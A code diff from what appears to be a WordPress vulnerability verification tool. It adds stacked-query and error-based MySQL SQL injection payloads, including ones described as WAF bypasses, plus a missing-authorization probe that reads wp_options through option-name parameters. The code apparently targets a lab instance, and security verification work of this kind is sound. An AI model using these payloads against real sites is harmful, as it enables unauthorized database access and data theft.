@@ -9853,6 +9853,73 @@ def verify_wordpress_sqli(
                         res.detail = f"PostgreSQL time-based blind SQLi: pg_sleep delay consistent ({_pg_consistent} pairs)"
                         step(f"SQLI POSTGRES time-based confirmado: {_pg_consistent} pares")
 
+        # SQLi technique 6: stacked queries (MySQL) — try `; SELECT sleep(5);--`
+        # Only some MySQL configurations allow multiple statements; but it's worth trying
+        # when all WHERE/ORDER BY techniques fail.
+        if not res.verified and boot is not None and sqli_param:
+            _stacked_pairs = [
+                (f"{orig_value}'; SELECT SLEEP(5);-- -", f"{orig_value}'; SELECT SLEEP(0);-- -"),
+                (f"{orig_value}; SELECT SLEEP(5)-- -", f"{orig_value}; SELECT SLEEP(0)-- -"),
+                ("1'); SELECT SLEEP(5);-- -", "1'); SELECT SLEEP(0);-- -"),
+                ("1; SELECT SLEEP(5)-- -", "1; SELECT SLEEP(0)-- -"),
+            ]
+            _st_baseline = []
+            for _ in range(2):
+                try:
+                    _t0 = time.time()
+                    send(orig_value)
+                    _st_baseline.append(time.time() - _t0)
+                except Exception:
+                    pass
+            _st_thresh = max(3.5, (sum(_st_baseline) / len(_st_baseline)
+                                   if _st_baseline else 0.5) * 2.5)
+            _st_consistent = 0
+            for _sp, _fp in _stacked_pairs:
+                try:
+                    _tf0 = time.time(); send(_fp); _tf = time.time() - _tf0
+                    _ts0 = time.time(); send(_sp); _ts = time.time() - _ts0
+                    if (_ts - _tf) >= _st_thresh:
+                        _st_consistent += 1
+                except Exception:
+                    pass
+            if _st_consistent >= 1:
+                res.verified = True
+                res.ok = True
+                res.confidence = "probable"
+                res.evidence["tecnica"] = "stacked-queries-sleep"
+                res.detail = f"SQLi stacked-queries time-based: SLEEP via stacked statement ({_st_consistent} pairs)"
+                step(f"SQLI stacked-queries confirmado: {_st_consistent} pares")
+
+        # SQLi extra error-based: GTID_SUBSET, EXP, floor(rand()) — bypass when
+        # extractvalue/updatexml are filtered by WAF or not available.
+        if not res.verified and boot is not None and sqli_param:
+            _extra_error_payloads = [
+                f"{orig_value}' AND GTID_SUBSET(CONCAT(0x7e,version()),0)-- -",
+                f"{orig_value}' AND EXP(~(SELECT * FROM (SELECT version()) t))-- -",
+                f"{orig_value}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- -",
+                f"{orig_value}' AND (SELECT 8928 FROM(SELECT COUNT(*),CONCAT(0x7e,version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+            ]
+            _extra_vs = [r.strip() for r in [
+                res.evidence.get("mysql_version_extraida", ""),
+                res.evidence.get("mysql_version_base", ""),
+            ] if r.strip()]
+            _extra_vs_patterns = _extra_vs or ["5.", "8.", "10.", "mariadb", "mysql"]
+            for _ep_extra in _extra_error_payloads:
+                try:
+                    _er = send(_ep_extra)
+                    _eb = (_er.text if hasattr(_er, "text") else "")[:500]
+                    if any(sig in _eb.lower() for sig in _extra_vs_patterns):
+                        res.verified = True
+                        res.ok = True
+                        res.confidence = "confirmed"
+                        res.evidence["tecnica"] = "error-based-alt"
+                        res.evidence["error_based_alt_snippet"] = _eb[:200]
+                        res.detail = "SQLi error-based (alt payload): version/data extracted via GTID_SUBSET/EXP/floor(rand())"
+                        step(f"SQLI error-based-alt confirmado: {_eb[:60]}")
+                        break
+                except Exception:
+                    pass
+
         # Post-exploit escalation for SQLi: extract version, user(), hashes
         if res.verified and boot is not None:
             try:
@@ -13364,6 +13431,7 @@ def verify_wordpress_missing_auth_probe(
                     if _r_add.returncode != 0:
                         lab.wp_cli("option", "update", _sentinel_key, _sentinel_uuid, timeout=20)
                     # Try the anonymous probe again with the sentinel now present
+                    # Standard sentinel probe
                     _sentinel_resp = anon_sess.request(
                         m, boot.base_url + endpoint,
                         json=params_dict if (m not in ("GET","HEAD") and json_body) else None,
@@ -13371,6 +13439,31 @@ def verify_wordpress_missing_auth_probe(
                         params=params_dict if m == "GET" else None,
                         timeout=15, allow_redirects=True)
                     _sentinel_body = (_sentinel_resp.text or "")
+                    # Targeted-option sentinel: if any param is named 'option', 'option_name',
+                    # 'key', or 'name' and might select a WP option, retry with that param
+                    # pointing directly to our sentinel key (CVE-2025-12630 pattern: endpoints
+                    # that fetch wp_options by name take the name from a request parameter).
+                    if _sentinel_uuid not in _sentinel_body:
+                        _option_param_keys = [k for k in params_dict
+                                              if k.lower() in ("option", "option_name", "key",
+                                                               "name", "option_key", "field")]
+                        for _opk in _option_param_keys:
+                            try:
+                                _targeted_params = dict(params_dict)
+                                _targeted_params[_opk] = _sentinel_key
+                                _t_resp = anon_sess.request(
+                                    m, boot.base_url + endpoint,
+                                    json=_targeted_params if (m not in ("GET","HEAD") and json_body) else None,
+                                    data=_targeted_params if (m not in ("GET","HEAD") and not json_body) else None,
+                                    params=_targeted_params if m == "GET" else None,
+                                    timeout=15, allow_redirects=True)
+                                if _sentinel_uuid in (_t_resp.text or ""):
+                                    _sentinel_body = _t_resp.text
+                                    res.evidence["targeted_option_param"] = _opk
+                                    step(f"[targeted-sentinel] sentinel encontrado via param '{_opk}'={_sentinel_key}")
+                                    break
+                            except Exception:
+                                pass
                     if _sentinel_uuid in _sentinel_body:
                         res.verified = True
                         res.confidence = "confirmed"
